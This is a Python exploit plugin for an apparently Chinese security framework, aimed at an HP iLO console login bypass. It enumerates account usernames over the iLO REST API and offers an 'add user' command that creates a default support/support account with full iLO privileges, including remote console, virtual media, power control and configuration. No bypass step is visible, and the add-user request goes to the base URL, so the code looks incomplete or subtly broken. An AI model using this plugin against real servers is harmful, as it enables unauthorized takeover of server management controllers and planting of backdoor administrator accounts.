# -*-* coding:UTF-8
import json
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "iLo独立登录控制台登录绕过漏洞",
        "description": "",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./rest/v1/AccountService/Accounts',
            timeout=15
        )
        if r.status_code == 200:
            resp = json.loads(r.text)
            data = []
            for i in resp['Items']:
                self.log.debug('Account name: %s Username: %s' % (i['Name'], i['Oem']['Hp']['LoginName']))
                data.append({"name": i['Name'], "username": i['Oem']['Hp']['LoginName']})
            self.__info__['data'] = data
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='添加用户账号')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("username", help="用户名称", default="support")
    @cli.options("password", help="用户密码", default="support")
    def add_user(self, url, username, password):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './'),
            timeout=15,
            json={
                'UserName': username,
                'Password': password,
                'Oem': {
                    'Hp': {
                        'LoginName': username,
                        'Privileges': {
                            'LoginPriv': True,
                            'RemoteConsolePriv': True,
                            'UserConfigPriv': True,
                            'VirtualMediaPriv': True,
                            'iLOConfigPriv': True,
                            'VirtualPowerAndResetPriv': True,
                        }
                    }
                }
            }
        )
        if r.status_code == 200:
            self.log.success('添加用户成功')
            self.log.success(f'用户名称: {username}')
            self.log.success(f'用户密码: {password}')
        else:
            self.log.failure('添加用户失败')
